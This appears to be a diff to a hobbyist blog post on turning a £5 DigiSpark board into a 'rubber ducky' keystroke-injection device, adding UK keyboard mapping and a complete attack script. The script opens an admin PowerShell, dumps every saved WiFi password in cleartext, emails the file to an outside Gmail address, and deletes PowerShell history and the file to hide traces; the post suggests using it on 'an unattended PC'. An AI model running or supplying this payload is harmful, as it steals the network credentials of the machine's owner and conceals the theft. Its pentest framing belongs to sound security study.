@@ -81,6 +81,13 @@ These include the ability to:
 - Execute Powershell scripts
 - Funny scripts to change the users mouse settings or download and play videos off YouTube (RickRoll) ...
 
+>These will all work on US keyboards by default.  
+For UK keyboards, you need a different board to map the correct keyboard codes.
+{: .prompt-danger }
+
+Mapping to UK keyboard:
+[DigiKeyboardUK](https://github.com/p0ep0e/DigiKeyboardUK)
+
 ### Recover & Email WiFi passwords Example
 
     //This DigiSpark script writes the wireless network credentials to a csv file and emails it.
@@ -137,3 +144,58 @@ These include the ability to:
       DigiKeyboard.sendKeyStroke(KEY_ENTER);
       for(;;){ /*empty*/ }
       }
+
+### UK Keyboard Recover & Email WiFi passwords Example  
+Modified the script here to use different characters and tested on Windows 11 as of March 3rd, 2023.  
+For google mail, ensure you have 2FA enabled as your password will be the `App-password`. Not your actual password...
+
+    #include "DigiKeyboardUK.h"
+    void setup() {
+    }   
+
+    void loop() {
+      DigiKeyboard.sendKeyStroke(0);
+      DigiKeyboard.delay(500);
+      DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+      DigiKeyboard.delay(500);
+      DigiKeyboard.sendKeyStroke(KEY_A);
+      DigiKeyboard.delay(1000);
+      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+      DigiKeyboard.delay(3000);
+      DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String -pattern '\w*All User Profile.*: (.*)' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String -pattern '\w*Key Content.*: (.*)' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path temp.csv;exit"));
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(3000);
+      DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+      DigiKeyboard.delay(500);
+      DigiKeyboard.sendKeyStroke(KEY_A);
+      DigiKeyboard.delay(1000);
+      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+      DigiKeyboard.delay(3000);
+      DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('<GMAIL EMAIL>', '<APP-PASSWORD>'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = '<SEND_EMAIL>'; $ReportEmail.To.Add('<TO_EMAIL>'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail);exit"));
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(500);
+      DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
+      DigiKeyboard.delay(500);
+      DigiKeyboard.sendKeyStroke(KEY_A);
+      DigiKeyboard.delay(1000);
+      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+      DigiKeyboard.delay(3000);
+      DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(500);
+      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+      DigiKeyboard.delay(500);
+      DigiKeyboard.print("cmd");
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(3000);
+      DigiKeyboard.print(F("del temp.csv"));
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      DigiKeyboard.delay(100);
+      DigiKeyboard.print(F("exit"));
+      DigiKeyboard.sendKeyStroke(KEY_ENTER);
+      for(;;){ /*empty*/ }
+      }
+
+# Summary
+It's proven that for just £5, you can create a rubber ducky equivalent.  
+If you find yourself near an unattended PC whilst doing a Physical Pentest, or just want to play around - give it a go!  
